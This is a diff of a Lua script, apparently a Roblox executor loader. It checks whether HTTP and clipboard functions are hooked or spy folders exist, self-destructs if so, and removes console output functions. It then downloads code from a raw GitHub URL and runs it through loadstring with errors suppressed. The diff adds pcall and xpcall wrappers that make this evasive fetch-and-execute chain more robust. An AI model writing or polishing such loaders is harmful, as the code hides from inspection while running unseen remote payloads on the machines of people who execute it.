@@ -19,21 +19,23 @@ local function checkHooks()
     if not isfunctionhooked then
         return false
     end
-    local hooks = {
-        game.HttpGet,
-        game.HttpPost,
-        tostring,
-        setclipboard,
-        request,
-        http_request,
+    
+    local safeChecks = {
+        {func = game and game.HttpGet},
+        {func = game and game.HttpPost},
+        {func = tostring},
+        {func = setclipboard},
+        {func = request},
+        {func = http_request},
     }
-    for _, func in ipairs(hooks) do
-        if func and isfunctionhooked(func) then
+    for _, check in ipairs(safeChecks) do
+        if check.func and isfunctionhooked(check.func) then
             return true
         end
     end
     if isfolder then
-        for _, folder in ipairs({"HttpGetFolder", "WebhookFolder", "RequestFolder"}) do
+        local folders = {"HttpGetFolder", "WebhookFolder", "RequestFolder"}
+        for _, folder in ipairs(folders) do
             if isfolder(folder) then
                 return true
             end
@@ -45,40 +47,42 @@ end
 
 for _, name in pairs({"rconsoleprint", "rconsolewarn", "rconsoleinfo", "rconsoleerr", "rconsoletitle", "clonefunction"}) do
     pcall(function()
-        if getgenv()[name] then
+        if getgenv() and getgenv()[name] ~= nil then
             getgenv()[name] = nil
         end
     end)
 end
 
 
-if isfunctionhooked then
-    if checkHooks() then
-        selfDestruct()
-    else
-        spawn(function()
-            local startTime = os.clock()
-            while os.clock() - startTime < 60 do
-                task.wait(2)
-                if checkHooks() then
-                    selfDestruct()
-                    break
+pcall(function()
+    if isfunctionhooked then
+        if checkHooks() then
+            selfDestruct()
+        else
+            spawn(function()
+                local startTime = os.clock()
+                while os.clock() - startTime < 60 do
+                    task.wait(2)
+                    if checkHooks() then
+                        selfDestruct()
+                        break
+                    end
                 end
-            end
-        end)
+            end)
+        end
     end
-end
-
+end)
 
 pcall(function()
     local url = "https://raw.githubusercontent.com/czcasdfwdk/dyk-jzq-czc/main/dykjzqjzq2-czc.lua"
     local content = game:HttpGet(url, true)
-    if content and #content > 100 then
-        
+    if content and type(content) == "string" and #content > 100 then
         local fn = loadstring(content)
         if fn then
             
-            pcall(fn)
+            xpcall(fn, function(err)
+                
+            end)
         end
     end
 end)
